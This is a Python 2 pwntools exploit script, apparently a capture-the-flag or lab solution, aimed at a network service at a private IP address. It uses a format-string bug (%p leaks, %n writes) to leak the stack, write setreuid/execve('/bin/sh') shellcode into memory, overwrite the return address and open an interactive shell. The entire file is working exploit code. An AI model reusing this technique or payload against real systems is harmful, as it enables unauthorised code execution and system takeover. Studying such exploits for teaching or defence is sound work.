from pwn import *
import struct
def getStackLeak(conn):
	conn.sendline("AAAA%5$p")
	data = int(conn.recvline().lstrip("AAAA"),16)
	#print "leak:%s"%hex(data)
	conn.recvuntil("Reading 13 bytes\n")
	return data

def writeShellCode(conn,shellcode,shellcode_addr):
	for index,x in enumerate(shellcode):
		value = ord(x)-4
		print hex(shellcode_addr+index)
		addr = struct.pack("<L",shellcode_addr+index)
		payload = "%s%%%sc%%7$n"%(addr,value)
		#print payload	
		conn.sendline(payload)
		conn.recvuntil("Reading 34 bytes\n")
	pass

def modifyReadSize(conn,read_loc):
	value = 30
	addr = struct.pack("<L",read_loc)
	payload = "%s%%%sc%%7$n"%(addr,value)
	conn.sendline(payload)
	print conn.recvuntil("Reading 34 bytes\n")
	pass

def rewriteReturnAddr(conn,ret_addr,shellcode_addr):
	sa = struct.pack("<L",shellcode_addr)
	for index,x in enumerate(sa):
		value = ord(x)-4 
		addr = struct.pack("<L",ret_addr+index)
		payload = "%s%%%sc%%7$n"%(addr,value)
		conn.sendline(payload)
		conn.recvuntil("Reading 34 bytes\n")

def rewriteWhileCheck(conn,while_check):
	addr = struct.pack("<L",while_check)
	payload = "%s%%%sc%%7$n"%(addr,0x1)
	conn.sendline(payload)
	pass

def dump_stack(conn):
	datas = []
	for x in xrange(0,1000):
		print x
		conn.sendline("AAAA%%%s$p"%x)
		data = conn.recvline()
		datas.append(data)
		conn.recvuntil("Reading 13 bytes\n")
	print datas
	pass

def main():
	HOST = "192.168.56.101"
	PORT = 53348
	conn = remote(HOST,PORT)
	shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
	print conn.recvuntil("Reading 13 bytes\n")
	raw_input("$")
	input_addr = getStackLeak(conn)
	while_check = input_addr-4
	shellcode_addr = while_check+24
	read_loc = while_check-8
	ret_addr = while_check+1044
	print "esp_18:%s"%hex(while_check)
	print "shellcode:%s"%hex(shellcode_addr)
	print "read_loc:%s"%hex(read_loc)
	modifyReadSize(conn,read_loc)
	writeShellCode(conn,shellcode,shellcode_addr)
	rewriteReturnAddr(conn,ret_addr,shellcode_addr)
	rewriteWhileCheck(conn,while_check)
	conn.interactive()
	
	#dump_stack(conn)
	pass
main()

